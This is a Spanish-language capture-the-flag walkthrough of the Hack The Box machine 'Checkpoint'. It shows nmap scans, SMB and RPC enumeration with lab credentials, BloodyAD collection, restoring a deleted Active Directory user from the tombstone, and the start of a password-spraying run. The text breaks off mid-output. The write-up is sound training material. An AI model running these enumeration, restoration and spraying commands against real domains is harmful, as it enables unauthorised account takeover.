---
title: "Checkpoint - Hack The Box"
date: 2026-06-13
unlock_date: 2026-10-31
draft: false
slug: "htb-writeup-checkpoint"
excerpt: "Esta fue una máquina bastante complicada. Después de analizar los escaneos, nos dirigimos al servicio SMB para enumerarlo, en donde veremos un directorio al que es posible cargar extensiones de VS Code, pero al no tener privilegios suficientes, no podremos hacer nada. Nos pasamos al servicio RPC para enumerar parte del AD, encontrando un usuario que podría permitirnos alguna acción en el futuro. Al no encontrar más y después de descubrir un mal funcionamiento en LDAPS, utilizamos la herramienta bloodyAD para enumerar la Tombstone del AD y además, descubrimos que nuestro usuario tiene permisos GenericWrite sobre un usuario que fue eliminado. Lo activamos con bloodyAD y aplicamos Password Spraying para encontrar su contraseña, siendo así que la descubrimos y vemos que este nuevo usuario tiene permisos de escritura sobre el directorio que permite cargar extensiones de VS Code. Creamos una Reverse Shell en un formato de extensión VSIX y la cargamos al SMB, siendo así que obtenemos una sesión activa de la máquina víctima. Viendo la versión del SO, identificamos que es vulnerable al ataque BadSuccessor y después de aplicarlo, obtenemos un Hash NT del usuario que descubrimos en el servicio RPC. Dicho usuario puede ver y descargar los archivos de un directorio compartido, que contiene la memoria de una máquina virtual y entre estos, vemos un snapshot que analizamos con volatility3 y logramos obtener el Hash NTLM del administrador, logrando al fin escalar privilegios."
categories: ["HackTheBox", "Medium Machine"]
tags: ["Windows", "Active Directory", "SMB", "RPC", "LDAP", "WinRM", "SMB Enumeration", "RPC Enumeration", "BloodyAD and BloodHound Enumeration", "Tomstone AD Enumeration", "Abuse of GenericWrite Permissions to Restore a Deleted User", "Password Spraying", "Malicious VSIX Extension", "Bad Successor Attack", "VM Memory Analisys (Forensics Method)", "Privesc - VM Memory Analisys (Forensics Method)", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "echo"
  - "netexec"
  - "smbmap"
  - "rpcclient"
  - "python3"
  - "bloodyAD"
  - "python"
  - "BloodHound"
  - "zip"
  - "tcpdump"
  - "rlwrap"
  - "nc"
  - "certutil.exe"
  - "Get-BadSuccessorOUPermissions.ps1"
  - "Rubeus.exe"
  - "base64"
  - "impacket-ticketConverter"
  - "export"
  - "ChatGPT"
  - "volatility3 (vol)"
  - "evil-winrm"
links:
  - "https://github.com/CravateRouge/bloodyAD"
  - "https://github.com/CravateRouge/bloodyAD/wiki/User-Guide#get-search"
  - "https://cravaterouge.com/articles/ad-bin/"
  - "https://learn.microsoft.com/es-es/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio"
  - "https://www.hackingarticles.in/abusing-badsuccessor-dmsa-stealthy-privilege-escalation/"
  - "https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch"
  - "https://www.akamai.com/es/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory?vid=badsuccessor-demo-video"
  - "https://www.revshells.com/"
  - "https://hackers-arise.com/digital-forensics-volatility-memory-analysis-guide-part-1/"
  - "https://medium.com/@refat47/analyzing-vmem-files-like-a-pro-memory-forensics-with-volatility-3-642919edd0c2"
  - "https://www.blackhillsinfosec.com/offline-memory-forensics-with-volatility/"
  - "https://github.com/volatilityfoundation/volatility3"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-checkpoint/checkpoint.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.129.23.222
PING 10.129.23.222 (10.129.23.222) 56(84) bytes of data.
64 bytes from 10.129.23.222: icmp_seq=1 ttl=127 time=184 ms
64 bytes from 10.129.23.222: icmp_seq=2 ttl=127 time=161 ms
64 bytes from 10.129.23.222: icmp_seq=3 ttl=127 time=163 ms
64 bytes from 10.129.23.222: icmp_seq=4 ttl=127 time=184 ms

--- 10.129.23.222 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 161.123/173.012/184.356/11.120 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.23.222 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-13 15:41 -0600
Initiating SYN Stealth Scan at 15:41
Scanning 10.129.23.222 [65535 ports]
Discovered open port 139/tcp on 10.129.23.222
Discovered open port 445/tcp on 10.129.23.222
Discovered open port 135/tcp on 10.129.23.222
Discovered open port 53/tcp on 10.129.23.222
Discovered open port 49673/tcp on 10.129.23.222
Discovered open port 3268/tcp on 10.129.23.222
Discovered open port 464/tcp on 10.129.23.222
Discovered open port 389/tcp on 10.129.23.222
Discovered open port 49708/tcp on 10.129.23.222
Increasing send delay for 10.129.23.222 from 0 to 5 due to 11 out of 22 dropped probes since last increase.
Discovered open port 49671/tcp on 10.129.23.222
Discovered open port 3269/tcp on 10.129.23.222
Discovered open port 49704/tcp on 10.129.23.222
Discovered open port 49675/tcp on 10.129.23.222
Discovered open port 49664/tcp on 10.129.23.222
Discovered open port 49670/tcp on 10.129.23.222
Discovered open port 9389/tcp on 10.129.23.222
Discovered open port 593/tcp on 10.129.23.222
Discovered open port 49684/tcp on 10.129.23.222
Discovered open port 88/tcp on 10.129.23.222
Discovered open port 636/tcp on 10.129.23.222
Completed SYN Stealth Scan at 15:42, 53.98s elapsed (65535 total ports)
Nmap scan report for 10.129.23.222
Host is up, received user-set (0.32s latency).
Scanned at 2026-06-13 15:41:47 CST for 54s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49704/tcp open  unknown          syn-ack ttl 127
49708/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.06 seconds
           Raw packets sent: 262122 (11.533MB) | Rcvd: 105 (4.608KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos bastantes puertos abiertos, pero algunos de estos, como el **puerto 88**, nos dicen que estamos enfrentándonos ante un **Active Directory**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49670,49671,49673,49675,49684,49704,49708 10.129.23.222 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-13 15:43 -0600
Nmap scan report for 10.129.23.222
Host is up (0.14s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-14 04:43:17Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc             Microsoft Windows RPC
49704/tcp open  msrpc             Microsoft Windows RPC
49708/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-time: 
|   date: 2026-06-14T04:44:08
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.56 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias al escaneo de servicios, vemos algunas cosas de interés:
* El servicio **SMB** necesita un usuario y contraseña para poder listar sus archivos compartidos.
* Tenemos el dominio del **AD** gracias al servicio **LDAP**, que registraremos en el `/etc/hosts`:
```bash
echo '10.129.23.222 checkpoint.htb DC01.checkpoint.htb' >> /etc/hosts
```

De momento, tenemos estas credenciales que podemos usar para enumerar algunos servicios:
```bash
alex.turner:Checkpoint2024!
```
Empecemos por el servicio **SMB**.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración del Servicio SMB {#SMB}

Probemos si funcionan las credenciales que tenemos:
```bash
nxc smb 10.129.23.222 -u 'alex.turner' -p 'Checkpoint2024!'
SMB         10.129.23.222    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.23.222    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
```
Funcionan.

Utilizaremos la herramienta **smbmap** para listar los archivos compartidos:
```bash
smbmap -H 10.129.23.222 -u 'alex.turner' -p 'Checkpoint2024!' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.23.222:445	Name: checkpoint.htb      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DevDrop                                           	READ ONLY	VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	VMBackups                                         	NO ACCESS	
[*] Closed 1 connections
```
De entre los archivos compartidos, vemos un directorio llamado **DevDrop** y tiene una descripción curiosa.

Investiguemos qué es un **paquete VSIX**:

| **Paquete/Archivo VSIX** |
|:------------------------:|
| *Un paquete VSIX es un archivo con extensión .vsix que se utiliza para instalar extensiones en Visual Studio y, en algunos casos, Visual Studio Code. VS Code utiliza principalmente archivos .vsix para instalar extensiones de forma manual (offline).* |

Además, podemos ver que los paquetes cargados deben ser compatibles con **VS Code engine 1.118.0**.

| **VS Code Engine** |
|:------------------:|
| *VS Code Engine es el mecanismo mediante el cual una extensión declara con qué versiones de Visual Studio Code es compatible. Se especifica en el archivo package.json mediante la propiedad engines.vscode y permite a VS Code verificar que la extensión puede ejecutarse correctamente antes de instalarla o activarla.* |

Parece que podemos aprovecharnos de esta función para crear una extensión maliciosa, para ya sea ejecutar comandos o para obtener una **Reverse Shell**.

Revisando el contenido, no encontraremos algo:
```bash
smbmap -H 10.129.23.222 -u 'alex.turner' -p 'Checkpoint2024!' -r 'DevDrop' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.23.222:445	Name: checkpoint.htb      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	DevDrop                                           	READ ONLY	VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
	./DevDrop
	dr--r--r--                0 Tue May 26 15:45:01 2026	.
	dr--r--r--                0 Sat May  9 08:42:27 2026	..
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	VMBackups                                         	NO ACCESS	
[*] Closed 1 connections
```
Entonces, tenemos que encontrar una forma de obtener un usuario con privilegios de escritura, esto para cargar un **paquete VSIX** malicioso.

Vayamos al **servicio RPC**.

### Enumeración del Servicio RPC {#RPC}

Entremos usando la herramienta **rpcclient**:
```batch
rpcclient -U 'alex.turner%Checkpoint2024!' 10.129.23.222
rpcclient $>
```

Primero, veamos los usuarios existentes:
```batch
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[alex.turner] rid:[0x44d]
user:[ryan.brooks] rid:[0x44f]
user:[svc_deploy] rid:[0x450]
user:[james.harper] rid:[0x457]
user:[sarah.mitchell] rid:[0x458]
user:[emily.carter] rid:[0x459]
user:[david.reynolds] rid:[0x45a]
user:[jessica.coleman] rid:[0x45b]
user:[lauren.flores] rid:[0x45c]
user:[michael.torres] rid:[0x45d]
user:[kevin.patterson] rid:[0x45e]
user:[brian.jenkins] rid:[0x45f]
user:[megan.perry] rid:[0x460]
user:[max.palmer] rid:[0x13ed]
```
Tenemos 14 usuarios, además de los que están por defecto, y entre esos, podemos ver uno llamado **svc_deploy** que quizá es quien nos ayude más adelante.

Veamos la información de ese usuario:
```batch
rpcclient $> queryuser 0x450
	User Name   :	svc_deploy
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Deployment service account
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	mié, 31 dic 1969 18:00:00 CST
	Logoff Time              :	mié, 31 dic 1969 18:00:00 CST
	Kickoff Time             :	mié, 13 sep 30828 20:48:05 CST
	Password last set Time   :	sáb, 09 may 2026 03:01:20 CST
	Password can change Time :	dom, 10 may 2026 03:01:20 CST
	Password must change Time:	mié, 13 sep 30828 20:48:05 CST
	unknown_2[0..31]...
	user_rid :	0x450
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```
Tiene una descripción, siendo que es una cuenta de servicio para despliegue.

Veamos si hay otros usuarios con descripciones:
```batch
rpcclient $> querydispinfo
index: 0x12be RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x1462 RID: 0x44d acb: 0x00000210 Account: alex.turner	Name: (null)	Desc: (null)
index: 0x1478 RID: 0x45f acb: 0x00000210 Account: brian.jenkins	Name: (null)	Desc: (null)
index: 0x1473 RID: 0x45a acb: 0x00000210 Account: david.reynolds	Name: (null)	Desc: (null)
index: 0x1472 RID: 0x459 acb: 0x00000210 Account: emily.carter	Name: (null)	Desc: (null)
index: 0x12bf RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x1470 RID: 0x457 acb: 0x00000210 Account: james.harper	Name: (null)	Desc: (null)
index: 0x1474 RID: 0x45b acb: 0x00000210 Account: jessica.coleman	Name: (null)	Desc: (null)
index: 0x1477 RID: 0x45e acb: 0x00000210 Account: kevin.patterson	Name: (null)	Desc: (null)
index: 0x13d0 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x1475 RID: 0x45c acb: 0x00000210 Account: lauren.flores	Name: (null)	Desc: (null)
index: 0x14c5 RID: 0x13ed acb: 0x00000210 Account: max.palmer	Name: (null)	Desc: (null)
index: 0x1479 RID: 0x460 acb: 0x00000210 Account: megan.perry	Name: (null)	Desc: (null)
index: 0x1476 RID: 0x45d acb: 0x00000210 Account: michael.torres	Name: (null)	Desc: (null)
index: 0x1464 RID: 0x44f acb: 0x00000210 Account: ryan.brooks	Name: (null)	Desc: (null)
index: 0x1471 RID: 0x458 acb: 0x00000210 Account: sarah.mitchell	Name: (null)	Desc: (null)
index: 0x1465 RID: 0x450 acb: 0x00000210 Account: svc_deploy	Name: (null)	Desc: Deployment service account
```
No hay nada que nos ayude.

Aprovechando lo que podemos ver en **RPC**, veamos a qué grupos pertenece el usuario **svc_deploy** y nuestro usuario.

Pero primero veamos los grupos existentes:
```batch
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[Forest Trust Accounts] rid:[0x210]
group:[External Trust Accounts] rid:[0x211]
group:[IT-Staff] rid:[0x451]
group:[Finance-Staff] rid:[0x452]
group:[HR-Staff] rid:[0x453]
group:[Engineering-Staff] rid:[0x454]
group:[VPN-Users] rid:[0x455]
group:[DevTeam] rid:[0x456]
group:[DnsUpdateProxy] rid:[0x462]
group:[BackupAccess] rid:[0x463]
```
Hay varios grupos existentes.

Ahora sí, veamos a qué grupos pertenece nuestro usuario:
```batch
rpcclient $> queryusergroups 0x44d
	group rid:[0x201] attr:[0x7]
	group rid:[0x455] attr:[0x7]
	group rid:[0x451] attr:[0x7]
```
Descartando el primer grupo (que es **Domain Users**), nuestro usuario está dentro de los grupos **VPN-Users e IT-Staff**.

Ahora veamos a que grupos pertenece el usuario **svc_deploy**:
```batch
rpcclient $> queryusergroups 0x450
	group rid:[0x201] attr:[0x7]
	group rid:[0x463] attr:[0x7]
```
Igual, descartando el primer grupo, el usuario **svc_deploy** está dentro del grupo **BackupAccess**.

Curiosamente, ese grupo solamente tiene un miembro y ya sabemos quién es:
```batch
rpcclient $> querygroup 0x463
	Group Name:	BackupAccess
	Description:	
	Group Attribute:7
	Num Members:1
```
Resumiendo esto, necesitamos llegar al usuario **svc_deploy** para ver algún **Backup**, que de hecho hay un directorio así en los archivos compartidos de **SMB**, o también para desplegar el paquete malicioso **VSIX**.

Vayamos directamente a enumerar el **AD** con **bloodhound-python**.

### Enumeración de AD con BloodyAD y BloodHound {#BloodHound}

Para poder enumerar el AD, podemos utilizar las herramientas **bloodhound-python** o **netexec**, pero parece que tendremos un problema por una mala configuración de **LDAPS**:
```bash
# Usando bloodhound-python
bloodhound-python -u 'alex.turner' -p 'Checkpoint2024!' -d checkpoint.htb -dc DC01.checkpoint.htb -ns 10.129.23.222 --zip -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
...
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1320, in resolve
    timeout = self._compute_timeout(start, lifetime, resolution.errors)
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1076, in _compute_timeout
    raise LifetimeTimeout(timeout=duration, errors=errors)
dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.23.222@53 answered The DNS operation timed out.

# Usando netexec
nxc ldap 10.129.23.222 -u 'alex.turner' -p 'Checkpoint2024!' -d 'checkpoint.htb' --bloodhound -c All
LDAP        10.129.23.222   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.23.222   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.23.222   389    DC01             Resolved collection methods: acl, localadmin, session, trusts, rdp, dcom, psremote, objectprops, container, group
LDAP        10.129.23.222   389    DC01             [-] BloodHound collection failed: LDAPSocketOpenError - socket ssl wrapping error: [Errno 104] Connection reset by peer
```
Pero una opción que podemos usar es **BloodyAD**, pero la versión más actualizada.

Aquí la puedes obtener:
* <a href="https://github.com/CravateRouge/bloodyAD" target="_blank">Repositorio de CravateRouge: BloodyAD</a>

Una vez que lo tengas, ejecútalo con la flag **get** pidiendo que enumere el **AD** para **BloodHound**:
```bash
python3 bloodyAD.py --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get bloodhound
[+] Connecting to LDAP server
[+] Connected to LDAP serrver
Dumping schema: 2it [00:00,  3.50it/s]
Generating lookuptable: 106it [00:01, 80.07it/s]
Dumping SDs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 110/110 [00:15<00:00,  6.93it/s]
Dumping domains: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  2.31it/s]
Dumping users: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 17/17 [00:00<00:00, 103.69it/s]
Dumping computers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  6.89it/s]
Dumping groups: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 58/58 [00:00<00:00, 338.49it/s]
Dumping GPOs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 13.74it/s]
Dumping OUs: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 8/8 [00:00<00:00, 54.02it/s]
Dumping Containers: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 104.30it/s]
[+] Bloodhound data saved to 20260615T163845_Bloodhound.zip
[+] Found 0 trusts
```
Listo, tenemos la colección de datos. Ahora, cárgalos a **BloodHound** y analicemos su contenido.

Investigando un poco sobre los usuarios, podemos encontrar lo siguiente del **usuario ryan.brooks**:

<p align="center">
<img src="/assets/images/htb-writeup-checkpoint/Captura1.png">
</p>

Este usuario tiene el permiso **GenericWrite** sobre el **usuario svc_deploy**, pero aún no tenemos acceso a ninguno de estos usuarios, así que tengamos en cuenta este dato para más adelante.

Además, comprobamos que el **usuario svc_deploy** está dentro del grupo **BackupAccess**:

<p align="center">
<img src="/assets/images/htb-writeup-checkpoint/Captura2.png">
</p>

De momento, es todo lo que podemos encontrar, pero quizá haya algo más que podamos consultar en el **AD**.

#### Analizando Tombstone de AD con BloodyAD y Obteniendo los Permisos de Escritura del Usuario alex.turner {#Tombstone}

Una opción que siempre hay que revisar es la **Tombstone** del **AD**, esto para buscar usuarios eliminados que contengan información, permisos o que podamos usar más adelante.

Para hacer esto de forma externa, podemos usar **BloodyAD**:
```bash
python bloodyAD.py get search -h
usage: bloodyAD.py get search [-h] [--base BASE] [--filter FILTER] [--attr ATTR] [--resolve-sd] [--raw] [--transitive] [-c C]

options:
  -h, --help       show this help message and exit
  --base BASE      DN of the parent object (default: DOMAIN)
  --filter FILTER  filter to apply to the LDAP search (see Microsoft LDAP filter syntax) (default: (objectClass=*))
  --attr ATTR      attributes to retrieve separated by a comma (default: *)
  --resolve-sd     if set, permissions linked to a security descriptor will be resolved (see bloodyAD github wiki/Access-Control for more information) (default: False)
  --raw            if set, will return attributes as sent by the server without any formatting, binary data will be outputed in base64 (default: False)
  --transitive     if set with "--resolve-sd", will try to resolve foreign SID by reaching trusts (default: False)
  -c C             if set, will use the controls for extended search operations, e.g. "-c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065" to display tombstoned, deleted and recycled
                   objects and their linked attributes (default: [])
```
Ahí mismo nos dice que podemos usar la flag `-c` y unos **controles de LDAP** para obtener la **Tombstone**.

Utilicemos el primer control junto a un filtro para que muestre objetos eliminados y veamos qué obtiene:
```bash
python bloodyAD.py --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)'
...
...
distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: Mark Davies
DEL:2217e877-e2a2-47d7-91d4-99ede36f367e
codePage: 0
countryCode: 0
dSCorePropagationData: 2026-05-10 13:38:56+00:00
givenName: Mark
instanceType: 4
isDeleted: True
lastKnownParent: OU=Employees,DC=checkpoint,DC=htb
...
```
Muy bien, encontramos un usuario llamado **Mark Davies** que parece que fue eliminado.

Si no hubíeramos obtenido nada, podemos utilizar ambos controles junto al flujo y un filtro para obtener toda la información de la **Tombstone**:
```bash
python bloodyAD.py --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --filter '(isDeleted=TRUE)'
```

El problema aquí es que no tenemos información del usuario, pero si revisamos qué permisos de escritura tiene nuestro **usuario alex.turner**, veremos algo interesante:
```bash
python bloodyAD.py --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```
Vemos que tenemos permisos de escritura sobre el **usuario mark.davies**. 

La idea ahora es reactivar ese usuario eliminado y ver una forma de obtener sus credenciales para ocupar ese usuario.

## Explotación de Vulnerabilidades {#Explotacion}

### Reactivando Usuario Eliminado de AD y Aplicando Password Spraying {#MarkSpraying}

El siguiente blog explica la importancia de revisar la **Tombstone** y cómo reactivar usuarios eliminados:
* <a href="https://cravaterouge.com/articles/ad-bin/" target="_blank">Have You Looked in the Trash? Unearthing Privilege Escalations from the Active Directory Recycle Bin</a>

Ahora, reactivemos el **usuario mark.davies** con **BloodyAD**:
```bash
python bloodyAD.py --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```
Listo, reactivamos este usuario.

Podemos comprobarlo con **rpcclient**:
```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[alex.turner] rid:[0x44d]
user:[mark.davies] rid:[0x44e]
...
```
El problema es que no tenemos una contraseña para este usuario.

Algo que no hemos probado es aplicar **Password Spraying** para saber si algún usuario tiene la misma contraseña que tenemos con el **usuario alex.turner**.

Podemos obtener una lista de usuarios con el siguiente one-liner:
```bash
rpcclient -U 'alex.turner%Checkpoint2024!' 10.129.23.222 -c "enumdomusers" | awk -F '[][]' '{print $2}' > usuarios.txt
```

Ahora, utilizaremos **netexec** para aplicar el **Password Spraying**, solo que utilizaremos **LDAP** para aplicarlo, ya que por algún motivo, obtenemos errores al usar **SMB**:
```bash
nxc ldap 10.129.23.222 -u usuarios.txt -p 'Checkpoint2024!' --no-bruteforce --continue-on-success
LDAP        10.129.23.222   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.23.222   389    DC01             [-] checkpoint.htb\Administrator:Checkpoint2024! 
